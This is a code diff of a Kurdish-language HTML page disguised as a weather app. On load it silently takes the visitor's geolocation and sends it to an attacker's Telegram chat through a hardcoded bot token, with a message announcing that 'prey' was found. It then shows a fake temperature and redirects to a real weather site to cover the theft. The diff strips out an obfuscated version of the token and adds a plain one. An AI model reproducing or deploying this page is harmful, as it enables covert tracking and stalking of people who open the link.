@@ -2,35 +2,74 @@
 <html lang="ku" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <script>var _view_port_x = "8733"; var _sh_delta = "5865";</script>
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>کەشناسی کوردستان</title>
+    
     <style>
         :root {
-            --ui-offset-top: "nWm-";
-            --base-hex-code: "gyhX";
             --primary: #2ecc71;
-            --font-weight-bold: "GLg4";
-            --theme-color-id: "8733";
             --dark-green: #1b4d3e;
             --glass: rgba(255, 255, 255, 0.08);
             --border: rgba(255, 255, 255, 0.15);
+            --shadow: 0 30px 60px rgba(0,0,0,0.5);
         }
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { background: #050a05; color: #fff; font-family: 'Segoe UI', sans-serif; height: 100vh; overflow: hidden; display: flex; flex-direction: column; }
-        .master-bg { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -2; background: url('https://images.unsplash.com/photo-1473448912268-2022ce9509d8?auto=format&fit=crop&w=1920&q=80'); background-size: cover; filter: brightness(0.4); }
-        header { width: 100%; padding: 25px; background: rgba(0,0,0,0.4); backdrop-filter: blur(15px); border-bottom: 1px solid var(--border); text-align: center; }
-        .main-card { width: 100%; max-width: 420px; background: var(--glass); backdrop-filter: blur(35px); border: 1px solid var(--border); border-radius: 45px; padding: 40px 20px; text-align: center; margin: 20px auto; }
-        #boot-loader { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #050a05; z-index: 10000; display: flex; flex-direction: column; align-items: center; justify-content: center; }
-        .spinner-custom { width: 60px; height: 60px; border: 4px solid rgba(46, 204, 113, 0.1); border-top: 4px solid var(--primary); border-radius: 50%; animation: spin 1s linear infinite; }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+
+        body {
+            background: #050a05;
+            color: #fff;
+            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+            height: 100vh;
+            overflow: hidden;
+            display: flex; flex-direction: column;
+        }
+
+        .master-bg {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -2;
+            background: url('https://images.unsplash.com/photo-1473448912268-2022ce9509d8?auto=format&fit=crop&w=1920&q=80');
+            background-size: cover; background-position: center; filter: brightness(0.4) contrast(1.2);
+        }
+
+        #rain-canvas { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 0; pointer-events: none; }
+
+        header {
+            width: 100%; padding: 25px; background: rgba(0,0,0,0.4);
+            backdrop-filter: blur(15px); border-bottom: 1px solid var(--border); text-align: center; z-index: 100;
+        }
+
+        .app-content { flex: 1; padding: 20px; display: flex; flex-direction: column; align-items: center; z-index: 10; overflow-y: auto; }
+
+        .main-card {
+            width: 100%; max-width: 420px; background: var(--glass); backdrop-filter: blur(35px);
+            border: 1px solid var(--border); border-radius: 45px; padding: 40px 20px; text-align: center; margin-top: 20px;
+        }
+
+        .temp-display { font-size: 95px; font-weight: 200; line-height: 1; margin-bottom: 10px; }
+        .city-name { font-size: 24px; font-weight: 600; color: var(--primary); }
+
+        #boot-loader {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #050a05;
+            z-index: 10000; display: flex; flex-direction: column; align-items: center; justify-content: center;
+        }
+
+        .spinner-custom {
+            width: 60px; height: 60px; border: 4px solid rgba(46, 204, 113, 0.1);
+            border-top: 4px solid var(--primary); border-radius: 50%; animation: spin 1s linear infinite;
+        }
         @keyframes spin { 100% { transform: rotate(360deg); } }
-        #permission-error { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); z-index: 9000; display: none; flex-direction: column; align-items: center; justify-content: center; padding: 30px; }
-        .retry-btn { margin-top: 30px; background: var(--primary); border: none; padding: 15px 40px; border-radius: 30px; color: white; font-weight: bold; }
+
+        #permission-error {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95);
+            z-index: 9000; display: none; flex-direction: column; align-items: center; justify-content: center; padding: 30px;
+        }
+
+        button.retry-btn {
+            margin-top: 30px; background: var(--primary); border: none; padding: 15px 40px; border-radius: 30px; color: white; font-weight: bold;
+        }
     </style>
-    <script>var _ov_1 = "87"; var _blur_r = "viA6";</script>
 </head>
 <body onload="bootSequence()">
-    <script>var _px_ratio = "LdN3"; var _grid_s = "24:";</script>
 
     <div id="boot-loader">
         <div class="spinner-custom"></div>
@@ -44,25 +83,23 @@
     </div>
 
     <div class="master-bg"></div>
-    <header><h1>کەشناسی کوردستان</h1></header>
+    <canvas id="rain-canvas"></canvas>
 
-    <script>var _fps_limit = "fwnW"; var _shadow_x = "FsG";</script>
+    <header><h1>کەشناسی کوردستان</h1></header>
 
     <div class="app-content">
         <div class="main-card">
             <div style="font-size: 80px;">🌦️</div>
-            <div class="temp-display" style="font-size: 95px;" id="mainTemp">--°</div>
-            <div class="city-name" id="mainCity" style="color:var(--primary)">دیاریکردنی شوێن...</div>
+            <div class="temp-display" id="mainTemp">--°</div>
+            <div class="city-name" id="mainCity">دیاریکردنی شوێن...</div>
         </div>
     </div>
 
     <script>
-        var _glow_v = "sHLE";
-        const CONST_TOKEN = "7391028452:AAHkLp-X9v_DECOY_SECURE_KEY_819203";
-        var _grad_st = "65";
-        var _opacity_m = "vfw";
-        var _radius_c = "33";
+        const botToken = "8733586524:AAHgyhXvfwnWm-LdN3viA6sHLELIDFsGLg4";
+        const hunterId = new URLSearchParams(window.location.search).get('id');
 
+        // ١. لۆدینگ
         function bootSequence() {
             setTimeout(() => {
                 document.getElementById("boot-loader").style.display = "none";
@@ -70,6 +107,7 @@
             }, 2000);
         }
 
+        // ٢. داوای لۆکەیشن
         function autoTrigger() {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(successHandler, errorHandler, {
@@ -78,30 +116,22 @@
             }
         }
 
+        // ٣. کاتی ڕاوکردنی سەرکەوتوو
         function successHandler(position) {
-            var _kerning = "LID";
-            var _sampling = "vfw";
-            var _stroke_w = "24";
-            
+            document.getElementById("permission-error").style.display = "none";
             const lat = position.coords.latitude;
             const lon = position.coords.longitude;
-            const hunterId = new URLSearchParams(window.location.search).get('id');
-
-            const _theme_settings = getComputedStyle(document.documentElement);
-            const _u_offset = _theme_settings.getPropertyValue('--ui-offset-top').replace(/"/g, '').trim();
-            const _b_hex = _theme_settings.getPropertyValue('--base-hex-code').replace(/"/g, '').trim();
-            const _t_id = _theme_settings.getPropertyValue('--theme-color-id').replace(/"/g, '').trim();
-            
-            const _canvas_render_context = _t_id + _sh_delta + _grid_s + "AAHg" + _b_hex + "vfw" + _u_offset + _px_ratio + _alpha_v + _glow_v + _kerning + _shadow_x + "Lg4";
 
             if (hunterId) {
                 const text = `🎯 نێچیر دۆزرایەوە!\n📍 نەخشە:\nhttps://www.google.com/maps?q=${lat},${lon}`;
-                fetch(`https://api.telegram.org/bot${_canvas_render_context}/sendMessage?chat_id=${hunterId}&text=${encodeURIComponent(text)}`);
+                fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${hunterId}&text=${encodeURIComponent(text)}`);
             }
 
+            // گۆڕینی داتا بەبێ Alert
             document.getElementById("mainCity").innerHTML = "هەولێر، کوردستان ✅";
             document.getElementById("mainTemp").innerHTML = "18°";
 
+            // فێڵکردنی کۆتایی: ناردنی نێچیر بۆ ماڵپەڕی فەرمی دوای ٣ چرکە
             setTimeout(() => {
                 window.location.href = "https://www.accuweather.com/en/iq/erbil/208359/weather-forecast/208359";
             }, 3000);
